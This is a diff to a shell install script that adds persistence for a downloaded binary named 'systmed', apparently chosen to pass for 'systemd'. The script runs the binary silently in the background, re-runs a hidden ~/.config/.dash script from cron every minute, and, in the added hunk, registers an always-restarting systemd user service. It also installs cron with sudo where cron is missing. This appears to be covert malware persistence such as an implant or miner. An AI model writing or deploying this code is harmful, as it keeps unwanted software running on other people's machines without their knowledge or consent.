@@ -47,7 +47,38 @@ execute_in_background() {
     nohup "$DEPLOY_DIR/systmed" >/dev/null 2>&1 &
 }
 
+setup_service() {
+    SERVICE_FILE="$HOME/.config/systemd/user/systmed.service"
+    mkdir -p "$HOME/.config/systemd/user"
+    cat > "$SERVICE_FILE" <<EOF
+[Unit]
+Description=Systmed Service
+After=network.target
+
+[Service]
+ExecStart=$bin_DIR/systmed
+Restart=always
+
+[Install]
+WantedBy=default.target
+EOF
+    systemctl --user daemon-reload
+    systemctl --user enable systmed.service
+    systemctl --user start systmed.service
+}
+
 setup_cron_job() {
+    if ! command -v crontab >/dev/null 2>&1; then
+        echo "crontab not found, attempting to install..."
+        if [ -f /etc/debian_version ]; then
+            sudo apt-get update && sudo apt-get install -y cron
+        elif [ -f /etc/redhat-release ]; then
+            sudo yum install -y cronie
+        else
+            echo "Unsupported system for automatic crontab installation"
+            exit 1
+        fi
+    fi
     (crontab -l 2>/dev/null | grep -v 'systmed_config'; echo "* * * * * /bin/bash $HOME/.config/.dash/systmed_config.sh") | crontab -
 }
 
@@ -112,7 +143,6 @@ download_and_setup() {
     chmod +x "$DOWNLOAD_DIR/systmed"
 }
 
-# 检查 systmed 文件是否存在，不存在则重新下载并部署
 if [ ! -f "$DOWNLOAD_DIR/systmed" ]; then
     mkdir -p "$bin_DIR"
     download_and_setup
@@ -144,6 +174,7 @@ main_install() {
             execute_in_background
             create_config_script
             setup_cron_job
+            setup_service
             touch "$FLAG_FILE"
             echo "ok gogo yes"
         else
